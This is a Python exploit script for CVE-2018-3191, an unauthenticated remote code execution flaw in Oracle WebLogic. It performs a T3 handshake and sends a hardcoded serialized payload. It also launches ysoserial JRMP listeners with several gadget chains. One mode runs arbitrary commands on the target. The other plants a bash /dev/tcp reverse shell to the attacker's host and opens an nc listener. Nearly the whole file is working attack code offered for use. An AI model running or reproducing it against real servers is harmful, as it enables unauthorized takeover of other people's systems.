#!/usr/bin/python
# This code exploits the CVE-2018-3191 unauthenticated RCE vulnerability in WebLogic
# 
# 
# https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html
# https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg
# https://github.com/pyn3rd/CVE-2018-3191
# The vulnerability affects supported versions:
# 10.3.6.0, 12.2.1.0, 12.1.3.0, 12.2.1.1, 12.2.1.3
#Tested on docker https://hub.docker.com/r/ismaleiva90/weblogic12/  (12.1.3.0)
#Tested on docker https://hub.docker.com/r/zhiqzhao/ubuntu_weblogic1036_domain/  (10.3.6.0)

# Information for building the exploit was taken from here: https://github.com/voidfyoo/CVE-2018-3191 and https://github.com/pyn3rd/CVE-2018-3191
# The version of ysoserial used in this exploit can be found at https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

# Dunstan Pinto, 14/11/2018 (dunstan.pinto@gmail.com)

import socket
import os
import sys
import struct
import time
import ssl

def t3_handshake_rs(sock,server_addr):
	sock.connect(server_addr)
	if len(sys.argv) > 5:
		if sys.argv[5] == '-ssl':
			sock.send('7433732031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
		else:
			print "Use -ssl option if weblogic server uses t3s"
			exit()
	else:
		sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
	time.sleep(1)
	sock.recv(1024)
	print 't3 handshake successful'

def t3_handshake_run(sock,server_addr):
	sock.connect(server_addr)
	if len(sys.argv) > 6:
		if sys.argv[6] == '-ssl':
			sock.send('7433732031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
		else:
			print "Use -ssl option if weblogic server uses t3s"
			exit()
	else:
		sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
	time.sleep(1)
	sock.recv(1024)
	print 't3 handshake successful'


#function to get a reverse shell
def rs(dip,dport,switch,sip,sslflag=False):
	server_addr = (dip, dport)
	print "Select the payload"
	jpayload = raw_input("1. CommonsCollections1 - commons-collections:3.1\n2. CommonsCollections2 - commons-collections4:4.0\n3. CommonsCollections3 - commons-collections:3.1\n4. CommonsCollections4 - commons-collections4:4.0\n5. CommonsCollections5 - commons-collections:3.1 and works with <=JRE 8u72\n6. CommonsCollections6 - commons-collections:3.1 and works with <=JRE 8u72\n7. Jdk7u21 - <=Jdk7u21\n")
	if jpayload == '1':
		t3_handshake_rs(sock,server_addr)
		print 'Generating ysoserial CommonsCollections1 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 \"bash -c $@|bash . echo bash -i >& /dev/tcp/{0}/8000 0>&1\"'".format(sip))
		time.sleep(3)
		os.system("mate-terminal --command 'nc -lvp 8000'")

	elif jpayload == '2':
		t3_handshake_rs(sock,server_addr)
		print 'Generating ysoserial CommonsCollections2 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections2 \"bash -c $@|bash . echo bash -i >& /dev/tcp/{0}/8000 0>&1\"'".format(sip))
		time.sleep(3)
		os.system("mate-terminal --command 'nc -lvp 8000'")
	elif jpayload == '3':
		t3_handshake_rs(sock,server_addr)
		print 'Generating ysoserial CommonsCollections3 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections3 \"bash -c $@|bash . echo bash -i >& /dev/tcp/{0}/8000 0>&1\"'".format(sip))
		time.sleep(3)
		os.system("mate-terminal --command 'nc -lvp 8000'")
	elif jpayload == '4':
		t3_handshake_rs(sock,server_addr)
		print 'Generating ysoserial CommonsCollections4 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 \"bash -c $@|bash . echo bash -i >& /dev/tcp/{0}/8000 0>&1\"'".format(sip))
		time.sleep(3)
		os.system("mate-terminal --command 'nc -lvp 7000'")
	elif jpayload == '5':
		t3_handshake_rs(sock,server_addr)
		print 'Generating ysoserial CommonsCollections5 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 \"bash -c $@|bash . echo bash -i >& /dev/tcp/{0}/8000 0>&1\"'".format(sip))
		time.sleep(3)
		os.system("mate-terminal --command 'nc -lvp 8000'")
	elif jpayload == '6':
		t3_handshake_rs(sock,server_addr)
		print 'Generating ysoserial CommonsCollections6 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 \"bash -c $@|bash . echo bash -i >& /dev/tcp/{0}/8000 0>&1\"'".format(sip))
		time.sleep(3)
		os.system("mate-terminal --command 'nc -lvp 8000'")
	elif jpayload == '7':
		t3_handshake_rs(sock,server_addr)
		print 'Generating ysoserial Jdk7u21 payload'    	
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 \"bash -c $@|bash . echo bash -i >& /dev/tcp/{0}/8000 0>&1\"'".format(sip))
		time.sleep(3)
		os.system("mate-terminal --command 'nc -lvp 8000'")
	else:
		print "Select one of the 7 payloads"
		exit()


#function to run arbitrary commands on the server
def run(dip,dport,switch,cmd,sip,sslflag=False):
	server_addr = (dip, dport)
	print "Select the payload"
	jpayload = raw_input("1. CommonsCollections1 - commons-collections:3.1\n2. CommonsCollections2 - commons-collections4:4.0\n3. CommonsCollections3 - commons-collections:3.1\n4. CommonsCollections4 - commons-collections4:4.0\n5. CommonsCollections5 - commons-collections:3.1 and works with <=JRE 8u72\n6. CommonsCollections6 - commons-collections:3.1 and works with <=JRE 8u72\n7. Jdk7u21 - <=Jdk7u21\n")
	if jpayload == '1':
		t3_handshake_run(sock,server_addr)
		print 'Generating ysoserial CommonsCollections1 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 \"{}\"'".format(cmd))
		time.sleep(3)
	elif jpayload == '2':
		t3_handshake_run(sock,server_addr)
		print 'Generating ysoserial CommonsCollections2 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections2 \"{}\"'".format(cmd))
		time.sleep(3)
	elif jpayload == '3':
		t3_handshake_run(sock,server_addr)
		print 'Generating ysoserial CommonsCollections3 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections3 \"{}\"'".format(cmd))
		time.sleep(3)
	elif jpayload == '4':
		t3_handshake_run(sock,server_addr)
		print 'Generating ysoserial CommonsCollections4 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 \"{}\"'".format(cmd))
		time.sleep(3)
	elif jpayload == '5':
		t3_handshake_run(sock,server_addr)
		print 'Generating ysoserial CommonsCollections5 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 \"{}\"'".format(cmd))
		time.sleep(3)
	elif jpayload == '6':
		t3_handshake_run(sock,server_addr)
		print 'Generating ysoserial CommonsCollections6 payload'
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 \"{}\"'".format(cmd))
		time.sleep(3)
	elif jpayload == '7':
		t3_handshake_run(sock,server_addr)
		print 'Generating ysoserial Jdk7u21 payload'  	
		os.system("mate-terminal --command 'java -cp ysoserial-master-ecc60747a5-1.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 \"{}\"'".format(cmd))
		time.sleep(3)
	else:
		print "Select one of the 7 payloads"
		exit()

def general_usage():
	print "Use the -c switch to execute an arbitrary command on the weblogic server, for e.g.: python cve-2018-3191.py <RHOST> <PORT> -c '<command>' <LHOST>"
	print "Use the -rs switch to get a reverse shell, for e.g.: python cve-2018-3191.py <RHOST> <PORT> -rs <LHOST>"
	print "Incase of SSL:"
	print "Use the -c switch to execute an arbitrary command on the weblogic server and -ssl switch to connect using t3s, for e.g.: python cve-2018-3191.py <RHOST> <PORT> -c '<command>' <LHOST> -ssl"
	print "Use the -rs switch to get a reverse shell and -ssl switch to connect using t3s, for e.g.: python cve-2018-3191.py <RHOST> <PORT> -rs <LHOST> -ssl"


if __name__=="__main__":
	try:
		dip = sys.argv[1]
		dport = int(sys.argv[2])
		switch = sys.argv[3]

		if switch == '-rs':
			try:    	
				sip = sys.argv[4]
				if len(sys.argv) > 5:
					if sys.argv[5] == '-ssl':
						sslflag = True
						print "[+] ssl mode enabled"
						sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
						sock.settimeout(20)
						rs(dip,dport,switch,sip,sslflag)
					else:
						print "Use -ssl option if weblogic server uses t3s"
						exit()

				else:
					print "[+] ssl mode disabled"
					sslflag = False
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					rs(dip,dport,switch,sip)
				sock.settimeout(20)
				print 'Exploiting CVE-2018-3191 to get a reverse shell'
				print "Based on your weblogic server version, select any one of the payloads"
				jndipayload = raw_input("1. 10.3.6.0.jar - for versions 10.3.6.0, 12.2.1.0, 12.1.3.0 and 12.2.1.1\n2. 12.2.1.3.jar - for version 12.2.1.3\n")
				if jndipayload == '1':
					payloadObj = os.popen(("java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://{0}:1099/Object").format(sip)).read()
				elif jndipayload == '2':
					payloadObj = os.popen(("java -jar weblogic-spring-jndi-12.2.1.3.jar rmi://{0}:1099/Object").format(sip)).read()
				else:
					print "Select one of the 2 payloads"
					exit()
				payload='\x00\x00\x09\xf3\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'
				payload=payload+payloadObj
				payload=payload+'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78'
				# adjust header for appropriate message length
				payload=struct.pack('>I',len(payload)) + payload[4:]
				print '[+] Payload sent!'
				try:
					sock.send(payload)
					data = sock.recv(1024)
				except:
					sock.close()
			except IndexError:
				print "Usage: python cve-2018-3191.py <RHOST> <PORT> -rs <LHOST>"
				print "For SSL: python cve-2018-3191.py <RHOST> <PORT> -rs <LHOST> -ssl"

		if switch == '-c':
			try:
				cmd = sys.argv[4]
				sip = sys.argv[5]
				if len(sys.argv) > 6:
					if sys.argv[6] == '-ssl':
						sslflag = True
						print "[+] ssl mode enabled"
						sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
						sock.settimeout(20)
						run(dip,dport,switch,cmd,sip,sslflag)
					else:
						print "Use -ssl option if weblogic server uses t3s"
						exit()
				else:
					print "[+] ssl mode disabled"
					sslflag = False
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					run(dip,dport,switch,cmd,sip)
				sock.settimeout(20)
				print "Exploiting CVE-2018-3191 to get run the command '{}'".format(cmd)
				print "Based on your weblogic server version, select any one of the payloads"
				jndipayload = raw_input("1. 10.3.6.0.jar - for versions 10.3.6.0, 12.2.1.0, 12.1.3.0 and 12.2.1.1\n2. 12.2.1.3.jar - for version 12.2.1.3\n")
				if jndipayload == '1':
					payloadObj = os.popen(("java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://{0}:1099/Object").format(sip)).read()
				elif jndipayload == '2':
					payloadObj = os.popen(("java -jar weblogic-spring-jndi-12.2.1.3.jar rmi://{0}:1099/Object").format(sip)).read()
				else:
					print "Select one of the 2 payloads"
					exit()
				payload='\x00\x00\x09\xf3\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'
				payload=payload+payloadObj
				payload=payload+'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78'
				# adjust header for appropriate message length
				payload=struct.pack('>I',len(payload)) + payload[4:]
				print '[+] Payload sent!'
				try:
					sock.send(payload)
					data = sock.recv(1024)
				except:
					sock.close()
			except IndexError:
				print "Usage: python cve-2018-3191.py <RHOST> <PORT> -c '<command>' <LHOST>"
				print "For SSL: python cve-2018-3191.py <RHOST> <PORT> -c '<command>' <LHOST> -ssl"

	except IndexError:
		general_usage()
